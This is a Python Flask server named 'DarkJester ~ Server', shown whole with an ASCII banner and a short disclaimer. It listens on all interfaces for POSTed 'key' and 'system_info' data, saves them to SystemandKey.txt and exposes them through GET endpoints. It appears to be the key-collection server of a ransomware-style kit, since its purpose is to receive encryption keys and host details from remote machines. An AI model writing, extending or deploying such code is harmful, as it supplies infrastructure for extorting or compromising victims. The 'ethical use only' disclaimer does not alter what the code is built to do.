
banner = r"""
________                __        ____.                __                
\______ \ _____ _______|  | __   |    | ____   _______/  |_  ___________ 
 |    |  \\__  \\_  __ \  |/ /   |    |/ __ \ /  ___/\   __\/ __ \_  __ \
 |    `   \/ __ \|  | \/    </\__|    \  ___/ \___ \  |  | \  ___/|  | \/
/_______  (____  /__|  |__|_ \________|\___  >____  > |__|  \___  >__|   
        \/     \/           \/             \/     \/            \/       
                                                    ~ Server

Disclaimer: DarkJester is intended solely for ethical and legitimate uses. We are not responsible for any malicious activities or unlawful actions that occur as a result of using DarkJester. It is your responsibility to ensure that the tool is used in compliance with all applicable laws and regulations. Misuse of DarkJester for harmful, illegal, or unauthorized purposes is strictly prohibited and will be at your own risk.
"""
from flask import Flask, request, jsonify
import os
import signal

app = Flask(__name__)
data_store = {}
file_name_output = 'SystemandKey.txt'

def save_data_to_file():
    with open(file_name_output, 'w') as f:
        f.write(f"Key: {data_store.get('key', 'N/A')}\n")
        f.write("System Information:\n")
        system_info = data_store.get('system_info', {})
        for k, v in system_info.items():
            f.write(f" {k}: {v}\n")

@app.route('/store-key', methods=['POST'])
def store_key():
    key_data = request.get_json()
    key = key_data.get('key')
    system_info = key_data.get('system_info')
    if key and system_info:
        data_store['key'] = key
        data_store['system_info'] = system_info
        save_data_to_file()
        print(f"Key: {key}")
        print("System Information:")
        for k, v in system_info.items():
            print(f" {k}: {v}")
        shutdown_server()
        return jsonify({"message": "Key and system information stored successfully"}), 200
    return jsonify({"error": "Key or system information is missing"}), 400

@app.route('/get-key', methods=['GET'])
def get_key():
    key = data_store.get('key')
    if key:
        return jsonify({"key": key}), 200
    return jsonify({"error": "Key not found"}), 404

@app.route('/get-system-info', methods=['GET'])
def get_system_info():
    system_info = data_store.get('system_info')
    if system_info:
        return jsonify({"system_info": system_info}), 200
    return jsonify({"error": "System information not found"}), 404

def shutdown_server():
    func = request.environ.get('werkzeug.server.shutdown')
    if func:
        func()
    else:
        os.kill(os.getpid(), signal.SIGINT)

if __name__ == '__main__':
    print(banner)
    app.run(host='0.0.0.0', port=5000, debug=False)
